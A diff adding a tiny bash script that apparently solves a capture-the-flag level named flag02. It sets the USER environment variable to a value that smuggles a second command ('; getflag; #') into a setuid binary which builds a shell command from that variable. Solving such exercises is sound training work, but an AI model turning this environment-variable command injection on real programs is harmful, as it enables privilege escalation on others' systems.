@@ -1,0 +1,6 @@
+#!/bin/bash
+
+# Overwrite the USER environment variable with the shellcode for the binary to
+# execute.
+USER="; getflag; #" /home/flag02/flag02
+
